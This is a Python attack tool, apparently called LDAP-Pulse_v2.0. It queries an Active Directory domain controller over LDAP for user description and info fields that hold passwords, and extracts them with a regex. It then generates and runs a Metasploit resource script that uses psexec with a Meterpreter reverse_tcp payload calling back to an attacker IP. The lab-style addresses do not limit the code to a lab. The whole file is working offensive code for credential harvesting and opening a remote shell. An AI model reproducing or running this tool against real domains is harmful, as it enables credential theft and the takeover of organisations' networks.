import re
import subprocess
import sys
from ldap3 import Server, Connection, ALL

# --- CONFIGURATION ---
TARGET_CONFIG = {
    'dc_ip': '192.168.56.101',
    'domain': 'lab.local',
    'user': 'low_priv_user',
    'password': 'Password123!',
    'lhost': '192.168.56.1'  # Attacker IP
}

class ExploitEngine:
    def __init__(self, target_config):
        self.config = target_config

    def generate_rc(self, target_user, target_pass):
        """Metasploit Resource Script."""
        filename = f"attack_{target_user}.rc"
        
        # Dropping the user into the Meterpreter prompt
        rc_content = f"""
        use exploit/windows/smb/psexec
        set PAYLOAD windows/meterpreter/reverse_tcp
        set RHOSTS {self.config['dc_ip']}
        set SMBDomain {self.config['domain']}
        set SMBUser {target_user}
        set SMBPass {target_pass}
        set LHOST {self.config['lhost']}
        set LPORT 4444
        set WfsDelay 10
        set DisablePayloadHandler false
        exploit -j -z
        """
        
        with open(filename, "w") as f:
            f.write(rc_content.strip())
        return filename

    def launch(self, rc_file):
        """Executing the attack"""
        print(f"\n[***] EXECUTING KILL CHAIN VIA METASPLOIT [***]")
        print(f"[*] Loading {rc_file}...")
        try:
            subprocess.run(["msfconsole", "-q", "-r", rc_file])
        except FileNotFoundError:
            print("[-] ERROR: 'msfconsole' not found in PATH. Is Metasploit installed?")
        except Exception as e:
            print(f"[-] Execution Error: {e}")

class LDAPHunter:
    def __init__(self, config):
        self.config = config
        self.conn = None
        
        # Making the search base dynamic for any domain length (e.g. corp.lab.local)
        self.search_base = ','.join([f"dc={part}" for part in self.config['domain'].split('.')])

    def connect(self):
        print(f"[*] Connecting to {self.config['dc_ip']}...")
        try:
            server = Server(self.config['dc_ip'], get_info=ALL)
            self.conn = Connection(server, 
                                 user=f"{self.config['domain']}\\{self.config['user']}", 
                                 password=self.config['password'])
            if not self.conn.bind():
                print("[-] Authentication Failed. Check creds.")
                return False
            print("[+] Connected successfully.")
            return True
        except Exception as e:
            print(f"[-] Connection Error: {e}")
            return False

    def hunt_passwords(self):
        if not self.conn: return

        print(f"[*] Scanning domain '{self.config['domain']}' for creds...")
        
        search_filter = '(&(objectClass=user)(|(description=*pass*)(description=*secret*)(info=*pass*)))'
        
        self.conn.search(search_base=self.search_base,
                    search_filter=search_filter,
                    attributes=['sAMAccountName', 'description', 'info'])
        
        hits = 0
        if self.conn.entries:
            for entry in self.conn.entries:
                
                # Safe string extraction,
                desc_val = str(entry.description.value) if entry.description else ""
                info_val = str(entry.info.value) if entry.info else ""
                
                full_text = f"{desc_val} {info_val}"
                user = str(entry.sAMAccountName.value)
                
                # Regex lookup
                match = re.search(r'(?:pass\w*|pwd|secret)[:=\s]+(\S+)', full_text, re.IGNORECASE)
                
                if match:
                    hits += 1
                    extracted_pass = match.group(1)
                    print(f"\n[!] VULNERABLE ACCOUNT FOUND: {user}")
                    print(f"    [+] Leak: {match.group(0)}")
                    print(f"    [+] Extracted Password: {extracted_pass}")
                    
                    self.trigger_exploit(user, extracted_pass)
        
        if hits == 0:
            print("[-] No cleartext credentials found this time.")

    def trigger_exploit(self, user, password):
        choice = input(f"    [?] LAUNCH ATTACK on {user}? (y/n): ")
        if choice.lower() == 'y':
            engine = ExploitEngine(self.config)
            rc_file = engine.generate_rc(user, password)
            engine.launch(rc_file)
            sys.exit()

if __name__ == '__main__':
    print("=== LDAP-Pulse_v2.0 ===")
    print("Automated Active Directory Enumeration & Exploitation\n")
    
    pulse = LDAPHunter(TARGET_CONFIG)
    if pulse.connect():
        pulse.hunt_passwords()
        
